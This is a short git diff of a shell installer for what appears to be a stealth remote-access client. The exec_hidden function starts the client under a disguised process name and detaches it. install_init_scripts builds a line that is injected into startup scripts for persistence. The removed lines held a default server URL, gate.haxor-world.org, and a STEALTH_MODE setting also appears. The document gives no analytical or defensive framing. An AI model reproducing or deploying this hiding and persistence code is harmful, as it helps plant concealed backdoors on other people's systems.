@@ -247,8 +247,7 @@ exec_hidden() {
 	
 	# Set environment variables for client
 	export SECRET="${SECRET}"
-	[[ -n "${SERVER_URL}" ]] && export SERVER_URL="${SERVER_URL}"
-	
+
 	set +m; exec -a "${PROC_HIDDEN_NAME}" ${CLIENT_PATH} &
 	disown -a &> "$ERR_LOG"
 }
@@ -267,11 +266,10 @@ install_init_scripts() {
 		return 1
 	fi
 	
-
 	
 	# Build environment variables string
 	local env_vars="SECRET='${SECRET}'"
-	[[ -n "${SERVER_URL}" ]] && env_vars="${env_vars} SERVER_URL='${SERVER_URL}'"
+	env_vars="${env_vars}"
 	INJECT_LINE="
 set +m; HOME=$HOME ${env_vars} $(command -v bash) -c \"exec -a ${PROC_HIDDEN_NAME} ${CLIENT_PATH}\" &>/dev/null &"
 	
@@ -319,8 +317,6 @@ init_vars() {
 	[[ -z "$SHELL" ]] && SHELL="$(grep ^"$(whoami)" /etc/passwd | cut -d: -f7)"
 	[[ ! -f "$SHELL" ]] && SHELL="/bin/bash" # Default to bash 
 	
-	# Set default values
-	[[ -z "$SERVER_URL" ]] && SERVER_URL="https://gate.haxor-world.org"
 	[[ -z "$STEALTH_MODE" ]] && STEALTH_MODE="1"
 	
 	# Validate required SECRET
